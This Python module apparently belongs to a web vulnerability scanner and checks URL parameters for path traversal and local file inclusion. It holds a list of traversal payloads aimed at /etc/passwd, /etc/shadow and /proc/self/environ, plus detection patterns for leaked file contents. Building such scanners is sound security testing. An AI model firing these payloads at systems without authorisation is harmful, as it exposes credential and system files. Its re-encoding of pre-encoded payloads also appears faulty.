"""
GrotAssault — Path traversal payloads.

Tests directory traversal / LFI vulnerabilities using:
- Classic ../ sequences with encoding variants
- OS-specific paths
- Null byte termination
- Double encoding and unicode normalization
"""

from __future__ import annotations

import logging
from typing import Any, List

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.path_traversal")


_UNIX_TARGETS = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ"]
_WIN_TARGETS = ["C:\\Windows\\win.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts"]

_TRAVERSAL_PAYLOADS: List[str] = [
    # Classic
    "../../../etc/passwd",
    "..\\..\\..\\Windows\\win.ini",
    # Encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%5C..%5C..%5CWindows%5Cwin.ini",
    # Double encoded
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Unicode
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    # Null byte (PHP < 5.3.4)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00.jpg",
    # Long paths
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",
    # Absolute
    "/etc/passwd",
    "file:///etc/passwd",
    # Filter bypass
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%00/..%00/..%00/etc/passwd",
]

_DETECTION_PATTERNS = [
    "root:x:",
    "root:*:",
    "[fonts]",  # win.ini
    "[extensions]",  # win.ini
    "localhost",  # /etc/hosts + Windows hosts
    "COMSPEC",  # proc/self/environ
]


class PathTraversalChecker(HttpClientMixin):
    """Test for directory traversal / local file inclusion."""

    def __init__(self, http_client: Any = None) -> None:
        self._client = http_client
        self._owns_client = False

    async def check(self, target: Target) -> List[Finding]:
        """Test path traversal on a target."""
        if not self._client:
            return []

        findings: List[Finding] = []
        tested_params = self._extract_params(target)

        for param_name, _original_value in tested_params:
            for payload in _TRAVERSAL_PAYLOADS:
                try:
                    url = self._inject_param(target.url, param_name, payload)
                    resp = await self._client.request(
                        method=target.method or "GET",
                        url=url,
                    )

                    text = resp.text if hasattr(resp, 'text') else ""
                    for pattern in _DETECTION_PATTERNS:
                        if pattern in text:
                            findings.append(Finding(
                                title=f"Path traversal: {param_name}",
                                description=(
                                    f"Parameter '{param_name}' on {target.url} is vulnerable "
                                    f"to path traversal. Payload: {payload[:60]}"
                                ),
                                severity=Severity.HIGH,
                                target=target,
                                evidence=f"param={param_name}, payload={payload[:60]}, match={pattern}",
                                remediation=(
                                    "Never use user input directly in file paths. "
                                    "Use allowlists, canonicalize paths, and enforce chroot."
                                ),
                                cwe=22,
                                tags=["path-traversal", "lfi"],
                            ))
                            return findings  # one confirmation is enough

                except Exception:
                    pass

        return findings

    @staticmethod
    def _extract_params(target: Target) -> List[tuple]:
        """Extract query string parameter names and values."""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(target.url)
        params = parse_qs(parsed.query)
        file_hints = ("file", "path", "page", "doc", "document", "template",
                      "include", "url", "src", "source", "img", "image",
                      "load", "read", "view", "download", "filename")
        results = []
        for name, values in params.items():
            results.append((name, values[0]))
        # Also try common parameter names even if not in URL
        for hint in file_hints:
            if hint not in params:
                results.append((hint, "test"))
        return results

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        """Replace or add a parameter value in the URL."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))
